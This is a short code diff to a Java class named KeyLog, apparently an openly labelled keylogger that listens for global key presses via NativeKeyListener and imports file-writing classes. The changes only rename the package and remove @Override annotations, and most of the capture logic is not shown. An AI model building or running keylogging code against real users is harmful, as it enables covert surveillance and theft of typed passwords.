@@ -1,4 +1,4 @@
-package hcks.keylogger;
+package keylogger;
 
 import java.io.File;
 import java.io.FileWriter;
@@ -55,7 +55,6 @@ public class KeyLog implements NativeKeyListener{
 		 System.out.println("Started :)");
 	}
 
-	@Override
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
 		
 		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
@@ -74,7 +73,6 @@ public class KeyLog implements NativeKeyListener{
 		
 	}
 
-	@Override
 	public void nativeKeyReleased(NativeKeyEvent arg0) {
 //		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
 //		if (keyPressed.length()==1) {
@@ -88,7 +86,6 @@ public class KeyLog implements NativeKeyListener{
 //		}
 	}
 
-	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
 //		char keyPressed = arg0.getKeyChar();
 //		
